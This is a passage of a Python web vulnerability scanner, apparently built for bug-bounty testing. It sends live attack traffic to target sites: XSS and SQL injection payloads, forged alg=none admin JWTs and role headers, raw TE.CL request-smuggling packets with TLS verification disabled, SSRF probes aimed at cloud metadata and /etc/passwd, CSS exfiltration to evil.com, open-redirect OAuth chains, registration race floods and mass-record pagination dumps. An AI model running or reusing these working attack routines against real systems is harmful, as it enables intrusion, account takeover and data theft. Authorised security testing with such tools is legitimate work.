# default scanner by adapting to HTML attr, JS string, URL param, JSON value
# ---------------------------------------------------------------------------

def detect_reflection_context(response_text, canary):
    """Detect where a canary value is reflected and return context type."""
    if canary not in response_text:
        return None
    idx = response_text.find(canary)
    before = response_text[max(0, idx-100):idx]
    after = response_text[idx+len(canary):idx+len(canary)+100]

    # JS string context: canary inside quotes in a script block
    if re.search(r'<script[^>]*>.*$', before, re.DOTALL):
        if re.search(r'["\']$', before.rstrip()):
            return "js_string"
        return "js_bare"

    # HTML attribute context: canary inside an attribute value
    if re.search(r'<[a-zA-Z][^>]*\s[a-zA-Z-]+=["\']\s*$', before):
        quote = '"' if before.rstrip().endswith('"') else "'"
        return f"html_attr_{quote}"

    # URL context: canary inside href/src/action
    if re.search(r'(?:href|src|action|data-url)=["\'][^"\']*$', before):
        return "url_attr"

    # JSON value context
    if re.search(r'["\']:\s*["\']?$', before.rstrip()):
        return "json_value"

    # HTML tag context: canary between tags
    if re.search(r'>\s*$', before.rstrip()) and re.search(r'^\s*<', after.lstrip()):
        return "html_text"

    return "html_text"  # default


def mutate_xss_for_context(context):
    """Return XSS payloads optimized for the detected reflection context."""
    if context == "js_string":
        return [
            '"-alert(1)-"',
            "'-alert(1)-'",
            '\\"-alert(1)-\\"',
            '";alert(1)//',
            "';alert(1)//",
            '${alert(1)}',
        ]
    elif context == "js_bare":
        return [
            'alert(1)',
            ';alert(1)//',
            '\nalert(1)\n',
        ]
    elif context and context.startswith("html_attr_"):
        q = context.split("_")[-1]
        oq = "'" if q == '"' else '"'
        return [
            f'{q}><script>alert(1)</script>',
            f'{q} onmouseover=alert(1) x={q}',
            f'{q} autofocus onfocus=alert(1) {q}',
            f'{oq} onload=alert(1) {oq}',
        ]
    elif context == "url_attr":
        return [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'javascript:alert(1)//',
        ]
    elif context == "json_value":
        return [
            '<script>alert(1)</script>',
            '"-alert(1)-"',
            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        ]
    else:  # html_text
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
        ]


def mutate_sqli_for_context(context, original_value="1"):
    """Return SQLi payloads adapted to value context (numeric vs string)."""
    is_numeric = original_value.strip().lstrip('-').isdigit()
    if is_numeric:
        return [
            f"{original_value} AND 1=1-- -",
            f"{original_value} AND 1=2-- -",
            f"{original_value} AND SLEEP(4)-- -",
            f"{original_value} UNION SELECT NULL-- -",
            f"{original_value} AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
        ]
    else:
        return [
            f"{original_value}' AND '1'='1",
            f"{original_value}' AND '1'='2",
            f"{original_value}' AND SLEEP(4)-- -",
            f"{original_value}' UNION SELECT NULL-- -",
            f"{original_value}' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
        ]


def scan_context_aware_xss(crawl_data):
    """XSS scanner that detects reflection context and uses optimal payloads."""
    findings = []
    canary = f"apexcanary{int(time.time()) % 100000}"

    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            # First probe: inject canary to detect context
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [canary]
                probe_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(probe_url, timeout=_TIMEOUT)
                context = detect_reflection_context(r.text, canary)
                if not context:
                    continue
                # Now use context-specific payloads
                for payload in mutate_xss_for_context(context):
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r2 = _S.get(test_url, timeout=_TIMEOUT)
                    if payload in r2.text and "text/html" in r2.headers.get("content-type",""):
                        findings.append({"type": f"XSS ({context} context)",
                                         "severity": "high", "url": test_url,
                                         "detail": f"Context-aware XSS in param '{p}' [{context}]: {payload[:50]}",
                                         "template": "apex-xss-ctx"})
                        break
            except: continue

    # Forms
    for form in crawl_data.get("forms", []):
        action = form.get("action","")
        if not action: continue
        for inp in form.get("inputs",[]):
            if inp.get("type") in ("submit","hidden","button","file"): continue
            name = inp.get("name","")
            if not name: continue
            try:
                data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
                data[name] = canary
                if form.get("method","GET").upper() == "POST":
                    r = _S.post(action, data=data, timeout=_TIMEOUT)
                else:
                    r = _S.get(action, params=data, timeout=_TIMEOUT)
                context = detect_reflection_context(r.text, canary)
                if not context:
                    continue
                for payload in mutate_xss_for_context(context):
                    data[name] = payload
                    if form.get("method","GET").upper() == "POST":
                        r2 = _S.post(action, data=data, timeout=_TIMEOUT)
                    else:
                        r2 = _S.get(action, params=data, timeout=_TIMEOUT)
                    if payload in r2.text and "text/html" in r2.headers.get("content-type",""):
                        findings.append({"type": f"XSS Form ({context} context)",
                                         "severity": "high", "url": action,
                                         "detail": f"Context-aware XSS in field '{name}' [{context}]",
                                         "template": "apex-xss-ctx"})
                        break
            except: continue
    return findings


def scan_context_aware_sqli(crawl_data):
    """SQLi scanner that adapts payloads to numeric vs string context."""
    findings = []
    error_patterns = ["sql syntax","mysql_fetch","ora-","postgresql","sqlite",
                      "syntax error","unclosed quotation","you have an error in your sql",
                      "warning: mysql","pg_query","division by zero","column count"]

    for url, params in crawl_data.get("params", {}).items():
        parsed = urllib.parse.urlparse(url)
        orig_qs = urllib.parse.parse_qs(parsed.query)
        for p in params:
            orig_val = orig_qs.get(p, ["1"])[0]
            for payload in mutate_sqli_for_context(None, orig_val):
                try:
                    qs = dict(orig_qs)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    start = time.time()
                    r = _S.get(test_url, timeout=12)
                    elapsed = time.time() - start
                    body = r.text.lower()
                    if any(e in body for e in error_patterns):
                        findings.append({"type": "SQLi (Context-Aware, Error-Based)",
                                         "severity": "critical", "url": test_url,
                                         "detail": f"SQL error via param '{p}' (value type: {'numeric' if orig_val.isdigit() else 'string'})",
                                         "template": "apex-sqli-ctx"})
                        break
                    if "SLEEP(4)" in payload and elapsed >= 4:
                        findings.append({"type": "SQLi (Context-Aware, Time-Based)",
                                         "severity": "critical", "url": test_url,
                                         "detail": f"Time-based SQLi in param '{p}' — {elapsed:.1f}s delay",
                                         "template": "apex-sqli-ctx"})
                        break
                    # Boolean-based: compare AND 1=1 vs AND 1=2
                    if "1=1" in payload:
                        qs[p] = [payload.replace("1=1","1=2")]
                        false_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                        r2 = _S.get(false_url, timeout=_TIMEOUT)
                        if abs(len(r.text) - len(r2.text)) > 50:
                            findings.append({"type": "SQLi (Context-Aware, Boolean-Based)",
                                             "severity": "critical", "url": test_url,
                                             "detail": f"Boolean SQLi in param '{p}' — response diff {abs(len(r.text)-len(r2.text))}b",
                                             "template": "apex-sqli-ctx"})
                            break
                except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 5: Subdomain brute-force, response diffing auth bypass,
#                Next.js/React specific, GraphQL mutation fuzzing,
#                TE.CL smuggling, IDOR pagination
# ---------------------------------------------------------------------------

_DNS_WORDLIST = [
    "api","app","admin","dev","staging","test","beta","internal","corp","vpn",
    "mail","smtp","ftp","ssh","git","gitlab","jenkins","jira","confluence",
    "portal","dashboard","login","auth","sso","oauth","id","identity",
    "cdn","static","assets","media","upload","files","storage","backup",
    "db","database","mysql","postgres","redis","mongo","elastic","kibana",
    "grafana","prometheus","metrics","logs","monitor","status","health",
    "api2","api-v2","api-v1","v1","v2","v3","legacy","old","new","next",
    "mobile","m","wap","web","www2","www3","secure","ssl","shop","store",
    "blog","news","docs","help","support","kb","wiki","forum","community",
    "sandbox","qa","uat","preprod","pre-prod","prod","production","live",
    "office","intranet","extranet","remote","vpn2","citrix","rdp","ws",
    "socket","ws","wss","push","notify","webhook","callback","events",
    "search","suggest","autocomplete","typeahead","graphql","gql","rest",
    "microservice","service","services","gateway","proxy","lb","loadbalancer",
]

def scan_subdomain_bruteforce(target):
    """DNS brute-force subdomain enumeration — finds what cert transparency misses."""
    findings = []
    found = []
    domain_parts = target.split(".")
    base = ".".join(domain_parts[-2:]) if len(domain_parts) >= 2 else target

    def resolve(sub):
        fqdn = f"{sub}.{base}"
        try:
            ips = socket.getaddrinfo(fqdn, None, socket.AF_INET)
            if ips:
                return fqdn, ips[0][4][0]
        except socket.gaierror:
            pass
        return None, None

    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=50) as pool:
        futures = {pool.submit(resolve, w): w for w in _DNS_WORDLIST}
        for future in as_completed(futures):
            fqdn, ip = future.result()
            if fqdn:
                found.append(fqdn)
                findings.append({"type": "Subdomain Found (Brute-Force)",
                                 "severity": "info", "url": f"https://{fqdn}",
                                 "detail": f"{fqdn} → {ip}",
                                 "template": "apex-subdomain-brute"})
    return findings, found


def scan_response_diff_auth_bypass(crawl_data):
    """Response diffing — detect auth bypass by comparing authenticated vs unauthenticated responses."""
    findings = []
    auth_paths = ["/admin","/dashboard","/api/admin","/api/users","/api/config",
                  "/internal","/management","/api/v1/users","/api/me","/profile"]
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        for path in auth_paths:
            url = f"{base}{path}"
            try:
                # Request without auth
                r1 = _S.get(url, timeout=5)
                # Request with fake auth headers
                r2 = _S.get(url, timeout=5, headers={
                    "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
                    "X-Auth-Token": "admin",
                    "X-User-Id": "1",
                    "X-Role": "admin",
                })
                # If fake auth returns more content, it's a bypass
                if (r2.status_code == 200 and r1.status_code in (401,403) and
                        len(r2.content) > 100):
                    findings.append({"type": "Auth Bypass via Fake Token",
                                     "severity": "critical", "url": url,
                                     "detail": f"Fake JWT/token returns 200 on {path}",
                                     "template": "apex-auth-diff"})
                elif (r1.status_code == r2.status_code == 200 and
                      abs(len(r1.content) - len(r2.content)) > 500):
                    # Same status but different content — possible privilege escalation
                    findings.append({"type": "Response Diff on Auth Headers",
                                     "severity": "medium", "url": url,
                                     "detail": f"Auth headers change response by {abs(len(r1.content)-len(r2.content))}b",
                                     "template": "apex-auth-diff"})
            except: continue
    return findings


def scan_nextjs_react_vulns(crawl_data, web_targets):
    """Next.js / React specific vulnerabilities."""
    findings = []
    for target in web_targets[:3]:
        # Next.js: /_next/static/chunks/ may expose source maps
        try:
            r = _S.get(f"{target}/_next/static/chunks/", timeout=5)
            if r.status_code == 200 and ".js" in r.text:
                findings.append({"type": "Next.js Chunk Directory Listing",
                                 "severity": "medium", "url": f"{target}/_next/static/chunks/",
                                 "detail": "Next.js chunks directory is listable",
                                 "template": "apex-nextjs"})
        except: pass
        # Next.js: __NEXT_DATA__ leaks server-side props
        try:
            r = _S.get(target, timeout=5)
            next_data = re.search(r'<script id="__NEXT_DATA__"[^>]*>({.*?})</script>', r.text, re.DOTALL)
            if next_data:
                data = json.loads(next_data.group(1))
                data_str = str(data)
                if any(x in data_str.lower() for x in ["password","secret","token","key","api","internal","private"]):
                    findings.append({"type": "Next.js __NEXT_DATA__ Sensitive Leak",
                                     "severity": "high", "url": target,
                                     "detail": "Sensitive data in __NEXT_DATA__ server props",
                                     "template": "apex-nextjs"})
        except: pass
        # Next.js: /api/ routes without auth
        for route in ["/api/user","/api/users","/api/me","/api/auth/session",
                      "/api/admin","/api/config","/api/env"]:
            try:
                r = _S.get(f"{target}{route}", timeout=3)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        if isinstance(data, dict) and any(k in str(data).lower()
                                for k in ["email","user","token","session","secret"]):
                            findings.append({"type": f"Next.js API Route Exposed: {route}",
                                             "severity": "high", "url": f"{target}{route}",
                                             "detail": "Next.js API route returns sensitive data without auth",
                                             "template": "apex-nextjs"})
                    except: pass
            except: continue
        # React: dangerouslySetInnerHTML sources in JS
        try:
            r = _S.get(target, timeout=5)
            if "dangerouslySetInnerHTML" in r.text:
                findings.append({"type": "React dangerouslySetInnerHTML Usage",
                                 "severity": "medium", "url": target,
                                 "detail": "dangerouslySetInnerHTML found — potential DOM XSS if user-controlled",
                                 "template": "apex-react"})
        except: pass
    return findings


def scan_graphql_mutation_fuzzing(crawl_data):
    """Fuzz GraphQL mutations for injection, IDOR, and missing auth."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql","/api/graphql","/gql"]:
            url = f"{base}{path}"
            # Get schema via introspection
            try:
                r = _S.post(url, json={"query":"{__schema{mutationType{fields{name args{name type{name kind ofType{name}}}}}}}"},
                           headers={"Content-Type":"application/json"}, timeout=5)
                if r.status_code != 200: continue
                data = r.json()
                mutations = (data.get("data",{}).get("__schema",{})
                             .get("mutationType",{}) or {}).get("fields",[]) or []
                for mut in mutations[:10]:
                    name = mut.get("name","")
                    args = mut.get("args",[])
                    # Build a test mutation
                    arg_str = " ".join(f'{a["name"]}: "test"' for a in args[:3])
                    test_query = f'mutation {{ {name}({arg_str}) {{ id }} }}'
                    try:
                        r2 = _S.post(url, json={"query": test_query},
                                    headers={"Content-Type":"application/json"}, timeout=5)
                        body = r2.text.lower()
                        # Check for SQLi in mutation
                        sqli_test = f'mutation {{ {name}({arg_str.replace("test", "test\\' OR \\'1\\'=\\'1")}) {{ id }} }}'
                        r3 = _S.post(url, json={"query": sqli_test},
                                    headers={"Content-Type":"application/json"}, timeout=5)
                        if any(e in r3.text.lower() for e in ["sql","syntax","mysql","ora-","pg_"]):
                            findings.append({"type": f"GraphQL Mutation SQLi: {name}",
                                             "severity": "critical", "url": url,
                                             "detail": f"SQL error in mutation {name}",
                                             "template": "apex-gql-mutation"})
                        # Check if mutation works without auth
                        if r2.status_code == 200 and "errors" not in body and name.lower() in (
                                "createuser","deleteuser","updateuser","createadmin","resetpassword",
                                "changepassword","updateemail","deleteaccount","createtoken"):
                            findings.append({"type": f"GraphQL Mutation Without Auth: {name}",
                                             "severity": "critical", "url": url,
                                             "detail": f"Sensitive mutation {name} accessible without authentication",
                                             "template": "apex-gql-mutation"})
                    except: continue
            except: continue
    return findings


def scan_te_cl_smuggling(web_targets):
    """TE.CL HTTP request smuggling — Transfer-Encoding takes priority over Content-Length."""
    findings = []
    import socket, ssl as _ssl
    for target in web_targets[:5]:
        try:
            parsed = urllib.parse.urlparse(target)
            host = parsed.netloc.split(":")[0]
            port = 443 if parsed.scheme == "https" else 80
            path = parsed.path or "/"

            # TE.CL: server uses TE, backend uses CL
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Content-Length: 4\r\n"
                f"\r\n"
                f"5c\r\n"
                f"GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n"
                f"0\r\n\r\n"
            ).encode()

            sock = socket.create_connection((host, port), timeout=5)
            if port == 443:
                ctx = _ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.settimeout(8)
            sock.send(payload)
            resp = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk: break
                    resp += chunk
            except: pass
            sock.close()
            resp_str = resp.decode("utf-8", errors="ignore")
            # If we get two responses or a 400 on the smuggled request
            if resp_str.count("HTTP/1.1") >= 2 or "GPOST" in resp_str:
                findings.append({"type": "HTTP Request Smuggling (TE.CL)",
                                 "severity": "critical", "url": target,
                                 "detail": "TE.CL desync — two responses received for one request",
                                 "template": "apex-smuggling-tecl"})
        except: continue
    return findings


def scan_idor_pagination(crawl_data):
    """IDOR via API pagination — ?page=0&limit=9999 dumps all records."""
    findings = []
    for url, params in crawl_data.get("params",{}).items():
        has_page = any(p.lower() in ("page","offset","skip","start","from","cursor") for p in params)
        has_limit = any(p.lower() in ("limit","size","count","per_page","pagesize","take") for p in params)
        if not (has_page or has_limit): continue
        try:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            # Try to dump everything
            for p in list(qs.keys()):
                if p.lower() in ("limit","size","count","per_page","pagesize","take"):
                    qs[p] = ["9999"]
                if p.lower() in ("page","offset","skip","start","from"):
                    qs[p] = ["0"]
            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
            r = _S.get(test_url, timeout=10)
            if r.status_code == 200:
                try:
                    data = r.json()
                    count = len(data) if isinstance(data, list) else len(data.get("data",data.get("items",data.get("results",[]))))
                    if count > 100:
                        has_sensitive = any(k in str(data).lower() for k in
                                           ["email","phone","ssn","credit","password","token","secret"])
                        sev = "critical" if has_sensitive else "high"
                        findings.append({"type": "IDOR via Pagination (Mass Data Exposure)",
                                         "severity": sev, "url": test_url,
                                         "detail": f"limit=9999 returns {count} records",
                                         "template": "apex-idor-pagination"})
                except: pass
        except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 6: Race condition on registration, timing-based user enum,
#                CSS exfil, open redirect → OAuth chain,
#                SSRF via PDF/image generation, NS takeover
# ---------------------------------------------------------------------------

def scan_race_condition_registration(crawl_data):
    """Race condition on registration — create duplicate accounts or bypass limits."""
    import concurrent.futures as _cf
    findings = []
    for page in crawl_data.get("pages",[]):
        url = page["url"]
        if not any(x in url.lower() for x in ["register","signup","join","create-account"]): continue
        base = "/".join(url.split("/",3)[:3])
        for path in ["/register","/signup","/api/register","/api/signup","/api/v1/register"]:
            endpoint = f"{base}{path}"
            uid = int(time.time()) % 100000
            payload = {"email": f"race{uid}@test.com", "username": f"race{uid}",
                       "password": "Test1234!", "name": "Race Test"}
            def attempt(_):
                try:
                    return _S.post(endpoint, json=payload, timeout=5)
                except: return None
            # Fire 10 simultaneous requests
            with _cf.ThreadPoolExecutor(max_workers=10) as pool:
                results = list(pool.map(attempt, range(10)))
            success = [r for r in results if r and r.status_code in (200,201)]
            if len(success) > 1:
                findings.append({"type": "Race Condition on Registration",
                                 "severity": "high", "url": endpoint,
                                 "detail": f"{len(success)}/10 parallel registrations succeeded — duplicate account possible",
                                 "template": "apex-race-reg"})
                break
    return findings


def scan_timing_user_enumeration(crawl_data):
    """Timing-based user enumeration — valid usernames take longer to process."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[]):
        if not any(x in page["url"].lower() for x in ["login","signin","auth"]): continue
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/login","/api/login","/auth/login","/signin","/api/signin"]:
            url = f"{base}{path}"
            try:
                times_valid, times_invalid = [], []
                for _ in range(5):
                    start = time.time()
                    _S.post(url, json={"email":"admin@admin.com","password":"wrongpassword_xyz"}, timeout=5)
                    times_valid.append(time.time() - start)
                    start = time.time()
                    _S.post(url, json={"email":f"nonexistent_{int(time.time())}@xyz123.com","password":"wrongpassword_xyz"}, timeout=5)
                    times_invalid.append(time.time() - start)
                avg_valid = sum(times_valid) / len(times_valid)
                avg_invalid = sum(times_invalid) / len(times_invalid)
                diff = abs(avg_valid - avg_invalid)
                if diff > 0.1:  # 100ms timing difference
                    findings.append({"type": "Timing-Based User Enumeration",
                                     "severity": "medium", "url": url,
                                     "detail": f"Valid user avg {avg_valid:.3f}s vs invalid {avg_invalid:.3f}s — {diff*1000:.0f}ms difference",
                                     "template": "apex-timing-enum"})
            except: continue
    return findings


def scan_css_exfil(crawl_data):
    """CSS injection data exfiltration via attribute selectors."""
    findings = []
    # CSS that exfiltrates CSRF tokens via attribute selectors
    # input[name="csrf"][value^="a"] { background: url(https://evil.com/?c=a) }
    css_payload = "}</style><style>input[type=hidden]{background:url(https://evil.com/css-exfil)}"
    for url, params in crawl_data.get("params",{}).items():
        for p in params:
            if not any(x in p.lower() for x in ["style","css","theme","color","class","skin","template"]): continue
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [css_payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=_TIMEOUT)
                if "css-exfil" in r.text and "text/html" in r.headers.get("content-type",""):
                    findings.append({"type": "CSS Injection Data Exfiltration",
                                     "severity": "high", "url": test_url,
                                     "detail": f"CSS injected via '{p}' — can exfiltrate CSRF tokens via attribute selectors",
                                     "template": "apex-css-exfil"})
                    break
            except: continue
    return findings


def scan_open_redirect_oauth_chain(crawl_data):
    """Chain open redirect → OAuth redirect_uri bypass → account takeover."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:5]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        # Find open redirects first
        redirect_params = ("url","redirect","next","return","goto","dest","continue")
        open_redirects = []
        for url, params in crawl_data.get("params",{}).items():
            if not url.startswith(base): continue
            for p in params:
                if p.lower() not in redirect_params: continue
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = ["https://evil.com"]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5, allow_redirects=False)
                    if "evil.com" in r.headers.get("Location",""):
                        open_redirects.append(test_url)
                except: continue
        if not open_redirects: continue
        # Now check if OAuth uses this domain as redirect_uri
        for oauth_path in ["/oauth/authorize","/oauth2/authorize","/auth/oauth","/connect/authorize"]:
            try:
                r = _S.get(f"{base}{oauth_path}", timeout=5, allow_redirects=False)
                if r.status_code in (200,302,400):
                    # Try to use open redirect as redirect_uri
                    chain_url = f"{base}{oauth_path}?client_id=test&response_type=code&redirect_uri={urllib.parse.quote(open_redirects[0])}"
                    r2 = _S.get(chain_url, timeout=5, allow_redirects=False)
                    loc = r2.headers.get("Location","")
                    if "evil.com" in loc or open_redirects[0].split("?")[0] in loc:
                        findings.append({"type": "Open Redirect → OAuth Chain (Account Takeover)",
                                         "severity": "critical", "url": chain_url,
                                         "detail": f"OAuth redirect_uri accepts open redirect — auth code leaks to attacker",
                                         "template": "apex-redirect-oauth"})
            except: continue
    return findings


def scan_ssrf_pdf_generation(crawl_data):
    """SSRF via PDF/image generation endpoints — wkhtmltopdf, PhantomJS, ImageMagick."""
    findings = []
    pdf_paths = ["/api/pdf","/api/export/pdf","/api/generate/pdf","/export",
                 "/api/screenshot","/api/render","/api/preview","/api/thumbnail",
                 "/api/convert","/api/image","/api/og-image","/api/social-image",
                 "/pdf","/screenshot","/render","/preview"]
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/",
        "file:///etc/passwd",
        "http://0.0.0.0:22",
    ]
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        for path in pdf_paths:
            url = f"{base}{path}"
            for payload in ssrf_payloads[:2]:
                try:
                    # Try GET with url param
                    for p in ["url","src","source","link","page","target","uri"]:
                        r = _S.get(f"{url}?{p}={urllib.parse.quote(payload)}", timeout=8)
                        if r.status_code == 200 and len(r.content) > 100:
                            content_type = r.headers.get("content-type","").lower()
                            if any(x in content_type for x in ["pdf","image","octet"]):
                                findings.append({"type": "SSRF via PDF/Image Generation",
                                                 "severity": "critical", "url": f"{url}?{p}={payload}",
                                                 "detail": f"PDF/image generator fetches {payload}",
                                                 "template": "apex-ssrf-pdf"})
                                break
                            if any(x in r.text for x in ["root:","ami-id","instance-id"]):
                                findings.append({"type": "SSRF via PDF Generation (Content Confirmed)",
                                                 "severity": "critical", "url": f"{url}?{p}={payload}",
                                                 "detail": "SSRF confirmed — internal content in response",
                                                 "template": "apex-ssrf-pdf"})
                                break
                    # Try POST
                    for p in ["url","src","source","link","page","target","uri","html"]:
                        r = _S.post(url, json={p: payload}, timeout=8,
                                   headers={"Content-Type":"application/json"})
                        if r.status_code == 200 and any(x in r.text for x in ["root:","ami-id"]):
                            findings.append({"type": "SSRF via PDF Generation (POST)",
                                             "severity": "critical", "url": url,
                                             "detail": f"POST {p}={payload} — SSRF confirmed",
                                             "template": "apex-ssrf-pdf"})
                            break
                except: continue
    return findings


def scan_ns_takeover(target, subdomains):
    """Subdomain takeover via dangling NS records — not just CNAME."""
    import subprocess as _sp
    findings = []
    for sub in subdomains[:30]:
        try:
            # Check NS records
            ns_result = _sp.run(["dig","+short","NS",sub],
                               capture_output=True, text=True, timeout=5)
            ns_records = [n.rstrip(".") for n in ns_result.stdout.splitlines() if n.strip()]
            if not ns_records: continue
            # Check if NS servers resolve
            for ns in ns_records:
                try:
                    import socket
                    socket.getaddrinfo(ns, None)
                except socket.gaierror:
                    # NS server doesn't resolve — potential takeover
                    findings.append({"type": "NS Subdomain Takeover",
                                     "severity": "critical", "url": f"dns://{sub}",
                                     "detail": f"NS record {ns} doesn't resolve — NS takeover possible",
                                     "template": "apex-ns-takeover"})
                    break
        except: continue
    return findings



def auto_login_attempt(base_url, crawl_data):
    """Auto-detect login forms and attempt login with test credentials — no --auth needed."""
    import requests as _r
    session = _r.Session()
    session.verify = False
    session.headers.update({"User-Agent": _USER_AGENTS[0]})

    # Find login/register forms
    for form in crawl_data.get("forms", []):
        action = form.get("action", "").lower()
        inputs = form.get("inputs", [])
        method = form.get("method", "").upper()
        if method != "POST": continue
        if not any(x in action for x in ["login","signin","auth","register","signup"]): continue

        has_email = any(i.get("type") == "email" or "email" in i.get("name","").lower() for i in inputs)
        has_pass = any(i.get("type") == "password" or "pass" in i.get("name","").lower() for i in inputs)
        if not (has_email or has_pass): continue

        # Try registration first (creates account we control)
        import time as _t
        uid = int(_t.time()) % 100000
        test_email = f"apextest{uid}@wearehackerone.com"
        test_pass = "ApexTest1234!"

        data = {}
        for inp in inputs:
            name = inp.get("name", "")
            itype = inp.get("type", "text")
            if "email" in name.lower() or itype == "email":
                data[name] = test_email
            elif "pass" in name.lower() or itype == "password":
                data[name] = test_pass
            elif "user" in name.lower() or "name" in name.lower():
                data[name] = f"apextest{uid}"
            elif itype not in ("submit", "hidden", "button"):
                data[name] = inp.get("value", "test")
            else:
                data[name] = inp.get("value", "")

        try:
            r = session.post(form["action"], data=data, timeout=8, allow_redirects=True)
            body = r.text.lower()
            if any(x in body for x in ["dashboard","welcome","logout","profile","token","success","verify"]):
                return session, test_email, test_pass
        except Exception:
            continue

    return None, None, None


# ---------------------------------------------------------------------------
# Intelligence Engine: dedup, CVSS scoring, attack chain detection,
# false positive reduction, finding verification
# ---------------------------------------------------------------------------

import hashlib as _hashlib

# CVSS-like severity weights
_SEVERITY_SCORE = {"critical": 9.0, "high": 7.0, "medium": 5.0, "low": 2.0, "info": 0.5}

# Attack chain rules: if these finding types co-exist, escalate severity
_CHAIN_RULES = [
    ({"Reflected XSS", "Missing CSRF Token"}, "XSS + No CSRF = Stored Account Takeover", "critical"),
    ({"SSRF", "AWS"}, "SSRF + Cloud Metadata = Credential Theft", "critical"),
    ({"Open Redirect", "OAuth"}, "Open Redirect + OAuth = Account Takeover", "critical"),
    ({"SQL Injection", "Exposed Endpoint"}, "SQLi + Admin Access = Full DB Compromise", "critical"),
    ({"Path Traversal", "Sensitive File"}, "LFI + Sensitive Files = Source Code Disclosure", "critical"),
    ({"CORS Misconfiguration", "JWT"}, "CORS + JWT = Cross-Origin Token Theft", "high"),
    ({"Subdomain Takeover", "Cookie"}, "Subdomain Takeover + Cookie = Session Hijack", "critical"),
    ({"GraphQL Introspection", "Missing Rate Limit"}, "GraphQL + No Rate Limit = Data Enumeration", "high"),
    ({"Prototype Pollution", "XSS"}, "Prototype Pollution + XSS = Universal XSS", "critical"),
    ({"IDOR", "User Enumeration"}, "IDOR + User Enum = Mass Account Compromise", "critical"),
]


# Templates that are theoretical/informational — never exploitable on their own
_THEORETICAL_TEMPLATES = {
    "apex-headers", "apex-hsts", "apex-clickjack", "apex-mime",
    "apex-policy", "apex-csp", "apex-h3-info",
}

# Findings that need proof of impact to be reported
_NEEDS_PROOF = {
    "apex-cors": lambda f: "with credentials" in f.get("detail", "").lower(),
    "apex-sensitive": lambda f: any(x in f.get("detail", "").lower()
                                     for x in ["password", "key", "token", "secret", "private"]),
    "apex-redirect": lambda f: "oauth" in f.get("url", "").lower() or "auth" in f.get("url", "").lower(),
}


def filter_exploitable_only(findings):
    """Remove findings that are theoretical, informational, or not proven exploitable.
    Only keeps findings where we have evidence of real-world impact."""
    exploitable = []
    for f in findings:
        template = f.get("template", "")
        severity = f.get("severity", "info")

        # Drop purely informational/theoretical findings
        if template in _THEORETICAL_TEMPLATES:
            continue

        # Drop info-severity unless it's a secret/credential
        if severity == "info" and "secret" not in f.get("type", "").lower():
            continue

        # For findings that need proof, check the proof function
        if template in _NEEDS_PROOF:
            if not _NEEDS_PROOF[template](f):
                continue

        # Drop findings with no URL (can't reproduce)
        if not f.get("url"):
            continue

        # Drop "Missing Header" findings — not exploitable
        if "missing header" in f.get("type", "").lower():
            continue

        # Drop generic info disclosure that's just server version
        if f.get("type", "").startswith("Info Disclosure:") and severity in ("info", "low"):
            continue

        exploitable.append(f)
    return exploitable


def deduplicate_findings(findings):
    """Remove duplicate findings — same type+base_URL = one finding."""
    seen = set()
    unique = []
    for f in findings:
        url = f.get("url","")
        # For param-based findings, deduplicate by type + base path only
        base_url = url.split("?")[0]
        ftype = f.get("type","")
        # For header/info findings, also deduplicate by host only
        if f.get("template","") in ("apex-headers","apex-hsts","apex-clickjack","apex-mime","apex-policy"):
            parsed = urllib.parse.urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
